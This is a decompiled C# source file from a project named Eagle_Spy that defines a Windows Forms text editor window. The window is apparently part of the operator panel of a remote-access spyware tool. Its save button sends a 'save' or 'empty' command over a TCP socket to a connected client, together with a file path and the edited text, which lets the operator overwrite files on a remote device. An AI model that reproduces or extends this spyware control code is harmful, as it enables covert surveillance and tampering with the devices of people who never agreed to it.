using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy
{
	// Token: 0x0200005D RID: 93
	[DesignerGenerated]
	public partial class Editor : Form
	{
		// Token: 0x060005D7 RID: 1495 RVA: 0x0008AD7C File Offset: 0x00088F7C
		public Editor()
		{
			base.Load += this.Editor_Load;
			base.Activated += this.Editor_Activated;
			this.path = null;
			this.Title = "null";
			this.InitializeComponent();
			this.Font = reso.f;
		}

		// Token: 0x060005D8 RID: 1496 RVA: 0x0008ADD8 File Offset: 0x00088FD8
		private void SpyStyle()
		{
			foreach (Button button in this.Panel1.Controls.OfType<Button>())
			{
				button.BackColor = SpySettings.DefaultColor_Foreground;
				button.ForeColor = SpySettings.DefaultColor_Background;
			}
			foreach (RichTextBox richTextBox in base.Controls.OfType<RichTextBox>())
			{
				richTextBox.ForeColor = SpySettings.DefaultColor_Foreground;
				richTextBox.BackColor = SpySettings.DefaultColor_Background;
			}
			foreach (Panel panel in base.Controls.OfType<Panel>())
			{
				panel.BackColor = SpySettings.DefaultColor_Background;
			}
		}

		// Token: 0x060005D9 RID: 1497 RVA: 0x00003BF1 File Offset: 0x00001DF1
		private void TOpacity_Tick(object sender, EventArgs e)
		{
			if (base.Opacity != 1.0)
			{
				base.Opacity += 0.1;
				return;
			}
			this.TOpacity.Enabled = false;
		}

		// Token: 0x060005DA RID: 1498 RVA: 0x0008AEDC File Offset: 0x000890DC
		private void Editor_Load(object sender, EventArgs e)
		{
			base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\8.ico");
			this.SpyStyle();
			this.EditText.ContextMenuStrip = this.CMenu;
			this.Text = this.Title;
			this.TOpacity.Interval = SpySettings.T_Interval;
			this.TOpacity.Enabled = true;
		}

		// Token: 0x060005DB RID: 1499 RVA: 0x00003C27 File Offset: 0x00001E27
		private void EditText_TextChanged(object sender, EventArgs e)
		{
			if (!this.b_ok.Visible & this.status)
			{
				this.b_ok.Visible = true;
			}
		}

		// Token: 0x060005DC RID: 1500 RVA: 0x00003C4C File Offset: 0x00001E4C
		private void Editor_Activated(object sender, EventArgs e)
		{
			this.status = true;
		}

		// Token: 0x060005DD RID: 1501 RVA: 0x0008AF44 File Offset: 0x00089144
		private void b_ok_Click(object sender, EventArgs e)
		{
			if ((this.classClient != null) & (Operators.CompareString(this.path, null, false) != 0))
			{
				object[] array2;
				if (this.EditText.Text.Length <= 0)
				{
					object[] array = new object[4];
					array[0] = this.Client;
					array[1] = string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"empty",
						Data.SPL_DATA,
						this.path
					});
					array[2] = Codes.Encoding().GetBytes("null");
					array2 = array;
					array[3] = this.classClient;
				}
				else
				{
					object[] array3 = new object[4];
					array3[0] = this.Client;
					array3[1] = string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.resultClient,
						Data.SPL_SOCKET,
						"save",
						Data.SPL_DATA,
						this.path,
						Data.SPL_DATA,
						this.EditText.Text
					});
					array3[2] = Codes.Encoding().GetBytes("null");
					array2 = array3;
					array3[3] = this.classClient;
				}
				object[] array4 = array2;
				this.classClient.SendMessage(array4);
				base.Close();
			}
		}

		// Token: 0x060005DE RID: 1502 RVA: 0x00003C55 File Offset: 0x00001E55
		private void CutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.EditText.Cut();
		}

		// Token: 0x060005DF RID: 1503 RVA: 0x00003C62 File Offset: 0x00001E62
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.EditText.Copy();
		}

		// Token: 0x060005E0 RID: 1504 RVA: 0x00003C6F File Offset: 0x00001E6F
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.EditText.Paste();
		}

		// Token: 0x0400062E RID: 1582
		public TcpClient Client;

		// Token: 0x0400062F RID: 1583
		public Client classClient;

		// Token: 0x04000630 RID: 1584
		public bool status;

		// Token: 0x04000631 RID: 1585
		public string path;

		// Token: 0x04000632 RID: 1586
		public string Title;
	}
}
